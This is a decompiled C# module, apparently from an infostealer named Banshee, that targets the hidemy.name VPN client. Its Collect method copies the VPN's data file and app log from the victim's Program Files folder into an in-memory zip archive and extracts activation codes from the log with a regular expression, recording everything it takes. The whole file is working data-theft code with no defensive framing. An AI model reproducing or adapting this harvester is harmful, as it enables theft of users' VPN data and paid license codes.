﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x0200002C RID: 44
	public class HideMyName : ITarget
	{
		// Token: 0x0600005B RID: 91 RVA: 0x00003D38 File Offset: 0x00003D38
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\Program Files\\hidemy.name VPN 2.0";
			if (!Directory.Exists(text))
			{
				return;
			}
			string text2 = ZipPath.Vpn("HideMyName");
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "HideMyName";
			if (File.Exists(text + "\\HideMyName"))
			{
				zip.AddFile(text2 + "\\HideMyName", File.ReadAllBytes(text + "\\HideMyName"));
				counterApplications.Files.Add(text + "\\HideMyName => " + text2 + "\\HideMyName");
			}
			if (File.Exists(text + "\\log-app.txt"))
			{
				zip.AddFile(text2 + "\\log-app.txt", File.ReadAllBytes(text + "\\log-app.txt"));
				counterApplications.Files.Add(text + "\\log-app.txt => " + text2 + "\\log-app.txt");
				List<string> list = new List<string>();
				foreach (object obj in new Regex("code\\s+(\\d+)").Matches(File.ReadAllText(text + "\\log-app.txt")))
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						string value = match.Groups[1].Value;
						if (!list.Contains(value))
						{
							list.Add(value);
						}
					}
				}
				if (list.Count<string>() > 0)
				{
					zip.AddTextFile(text2 + "\\ActivatedCodes.txt", string.Join("\n", list));
					counterApplications.Files.Add(text + "\\log-app.txt => " + text2 + "\\ActivatedCodes.txt");
				}
			}
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Vpns.Add(counterApplications);
		}
	}
}
